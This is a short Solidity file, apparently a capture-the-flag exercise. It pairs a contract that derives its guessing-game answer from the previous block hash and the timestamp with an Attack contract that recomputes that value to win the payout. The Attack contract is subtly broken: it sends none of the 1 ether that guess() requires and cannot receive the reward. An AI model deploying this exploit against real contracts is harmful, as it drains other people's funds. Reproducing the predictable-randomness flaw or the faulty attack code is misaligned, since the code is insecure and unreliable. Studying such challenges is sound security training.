pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {

    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Attack {
    GuessTheNewNumberChallenge private gn;

    constructor(address gtncAddress) public {
        gn = GuessTheNewNumberChallenge(gtncAddress);
    } 

    function attack() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        gn.guess(answer);
    }
}


